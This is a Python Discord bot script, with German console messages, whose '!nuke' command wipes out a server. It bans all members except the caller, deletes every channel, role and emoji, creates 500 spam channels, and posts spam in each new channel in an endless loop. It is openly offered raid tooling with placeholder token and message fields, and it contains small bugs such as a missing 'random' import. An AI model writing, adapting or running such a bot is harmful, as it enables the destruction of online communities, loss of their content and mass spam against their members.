import discord
from discord.ext import commands
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "IHR_TOKEN_HIER"

SPAM_CHANNEL =  ["CHANNEL NAME"]
SPAM_MESSAGE = ["MESSAGE"]


client = commands.Bot(command_prefix="!" , intents=discord.Intents.all())


@client.event
async def on_ready():
    print("Bereit!")
    await client.change_presence(activity=discord.Game(name="BOTS STATUS"))


@client.command()
@commands.has_permissions(administrator=True)
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} wurde erfolgreich abgemeldet." + Fore.RESET)


@client.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for member in guild.members:
        if member == ctx.author:
            continue
        try:
            await member.ban()
            print(Fore.MAGENTA + f"{member.name}#{member.discriminator} wurde gebannt." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{member.name}#{member.discriminator} konnte nicht gebannt werden." + Fore.RESET)
    await asyncio.sleep(1)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} wurde gelöscht." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} konnte nicht gelöscht werden." + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} wurde gelöscht." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} konnte nicht gelöscht werden." + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} wurde gelöscht." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} konnte nicht gelöscht werden." + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban("IHR_USERNAME_UND_TAG")
            print(Fore.MAGENTA + f"{user.name}#{user.discriminator} wurde erfolgreich entbannt." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{user.name}#{user.discriminator} wurde nicht entbannt." + Fore.RESET)
    await guild.create_text_channel("TEXT_OF_SPAMMED_CHANNELS")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"Neue Einladung: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"{guild.name} wurde erfolgreich vernichtet.")
    return


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))


client.run(token)
